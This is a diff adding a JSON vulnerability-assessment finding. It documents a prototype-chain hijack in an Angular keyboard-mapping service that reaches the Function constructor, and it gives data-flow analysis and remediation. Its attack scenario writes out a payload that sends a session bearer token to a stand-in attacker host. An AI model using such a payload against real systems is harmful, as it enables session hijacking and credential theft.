@@ -1,0 +1,86 @@
+{
+  "schema_version": "1.0",
+  "phase": "inquisitor",
+  "vulnerability_id": "VULN-002",
+  "descriptor": "keyboard-dynamic-dispatch-prototype-hijack",
+  "assessment_id": "2026-07-31-10-57",
+  "metadata": {
+    "investigated": "2026-07-31T12:00:00Z",
+    "analyst": "D4rthB0b-Inquisitor",
+    "status": "confirmed"
+  },
+  "investigation": {
+    "confirmed_at": "2026-07-31T12:00:00Z",
+    "exploitability": "high",
+    "root_cause": "KeyboardMappingService.checkKeyboardMappings() (keyboard-mapping.service.ts:133-150) performs dynamic bracket-notation dispatch: this.jsFunc[methodName](param) where methodName is extracted from the targetFunction string in KeyboardMappings.json or from server-supplied keyboard mappings (initMapping(res.keyboardMapping)). The only guard is a truthiness check `if(this.jsFunc[methodName])`. JavaScript's prototype chain is fully accessible via bracket notation — this.jsFunc['constructor'] returns the Function constructor (a truthy value). Therefore, an attacker-controlled targetFunction value of 'constructor(PAYLOAD)' causes this.jsFunc.constructor(PAYLOAD)() to be executed, which is eval-equivalent new Function() arbitrary code execution. The IJSFunctionService interface is empty (no methods defined), meaning any bracket-notation access falls through to the prototype chain.",
+    "attack_scenario": "Attack Path 1 (Static Asset Tampering): Attacker modifies KeyboardMappings.json (no lockfile VULN-014, no artifact signing VULN-018, no integrity check). Sets targetFunction = 'constructor(document.location=\"https://attacker.com/?t=\"+sessionStorage.getItem(\"gx_token\"))'. User presses the mapped key combination. KeyboardMappingService extracts methodName='constructor', param='document.location=...'. this.jsFunc['constructor'] is Function constructor (truthy). this.jsFunc['constructor']('document.location=...')() executes. Bearer token exfiltrated.\n\nAttack Path 2 (ApplinX Server Compromise): Compromised ApplinX server returns malicious keyboardMapping in CreateSessionResponse. Same execution path — methodName='constructor', arbitrary code runs on first matching keypress.",
+    "prerequisites": [
+      "Attacker must modify KeyboardMappings.json (supply chain / static asset tampering) OR compromise ApplinX REST API server to inject malicious keyboard mappings",
+      "User must press the key combination mapped to the malicious targetFunction",
+      "No allowlist of permitted method names in JSFunctionsService (confirmed — interface is empty)"
+    ],
+    "privilege_boundary": {
+      "start_privilege": "Static asset modification capability (supply chain) or ApplinX server compromise",
+      "achieved_privilege": "Arbitrary JavaScript execution in authenticated user's browser — full DOM access, sessionStorage read, network exfiltration, credential theft",
+      "boundary_crossed": true
+    },
+    "impact": {
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "low",
+      "description": "Eval-equivalent RCE in browser context. Attacker can: exfiltrate Bearer token from sessionStorage (enabling full ApplinX session hijack), read all terminal screen content, capture credentials from DOM password fields, execute arbitrary ApplinX host commands via sendKeys, and pivot to other application state. Combined attack chain: VULN-002 → VULN-008 (token theft via sessionStorage) → full host session takeover. This is the highest-severity finding in the assessment."
+    },
+    "data_flow": {
+      "sources": [
+        "KeyboardMappings.json 'targetFunction' string — static file, same-origin in production",
+        "ApplinX REST API CreateSessionResponse/GetInfoResponse keyboardMapping array — server-controlled"
+      ],
+      "transformations": [
+        "targetFunction.indexOf('(') extracts position of first '('",
+        "keyFunc.substring(0, beginBracket) extracts methodName — no validation",
+        "keyFunc.substring(beginBracket+1, keyFunc.length-1) extracts param",
+        "if(this.jsFunc[methodName]) truthiness check — does NOT block prototype chain (constructor is truthy)",
+        "this.jsFunc[methodName](param) — bracket-notation call on prototype chain"
+      ],
+      "sinks": [
+        "this.jsFunc[methodName](param) at keyboard-mapping.service.ts:140 — arbitrary code execution via Function constructor",
+        "this.navigationService.sendKeys(keyFunc) at line 145 — arbitrary key value sent to ApplinX host (VULN-019)"
+      ]
+    }
+  },
+  "affected_components": {
+    "direct": [
+      {"component": "KeyboardMappingService.checkKeyboardMappings() — src/app/services/keyboard-mapping.service.ts:133-150", "impact": "Eval-equivalent code execution — prototype chain traversal to Function constructor"},
+      {"component": "IJSFunctionService — src/common/js-functions/ijs-functions.service (empty interface)", "impact": "No method allowlist defined; any bracket-notation access falls through to prototype"}
+    ],
+    "indirect": [
+      {"component": "StorageService / sessionStorage gx_token", "impact": "Bearer token accessible to arbitrary JS executed via this path"},
+      {"component": "KeyboardMappings.json (assets/config/)", "impact": "Attack vector for static asset tampering — no integrity protection"},
+      {"component": "VULN-014 (missing package-lock.json)", "impact": "Supply chain attack enables injecting malicious KeyboardMappings.json"},
+      {"component": "VULN-018 (sign-artifact disabled)", "impact": "No artifact signing — modified JSON undetectable in build pipeline"}
+    ]
+  },
+  "remediation_guidance": {
+    "recommended_fix": "Add a hasOwnProperty check AND an explicit allowlist before dispatch: `if (!Object.prototype.hasOwnProperty.call(this.jsFunc, methodName)) { this.logger.error('Blocked: method not on jsFunc own properties'); return; }`. Additionally define an explicit allowed method list in IJSFunctionService and verify methodName is in that list. This eliminates prototype chain access entirely.",
+    "priority": "immediate",
+    "defense_in_depth": [
+      "Add Object.prototype.hasOwnProperty.call(this.jsFunc, methodName) guard before dispatch",
+      "Define explicit allowlist: const ALLOWED = new Set(['method1', 'method2']); if (!ALLOWED.has(methodName)) reject",
+      "Validate KeyboardMappings.json targetFunction against strict regex: only letters/digits allowed in method name portion",
+      "Enable artifact signing (VULN-018) to detect static asset tampering",
+      "Commit package-lock.json (VULN-014) for reproducible builds",
+      "Consider using a compile-time method dispatch enum instead of runtime string lookup"
+    ]
+  },
+  "references": {
+    "scan_finding": "vulnerabilities/VULN-002-keyboard-dynamic-dispatch-prototype-hijack/VULN-002-S-scan-finding.md",
+    "threat_model": ["TM-003"],
+    "attack_surface": ["AS-003", "AS-004"],
+    "external": [
+      "CWE-913: Improper Control of Dynamically-Managed Code Resources",
+      "OWASP A03:2021 — Injection",
+      "MDN: Function() constructor as eval-equivalent — https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function",
+      "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:L — Score: 8.0 HIGH"
+    ]
+  }
+}
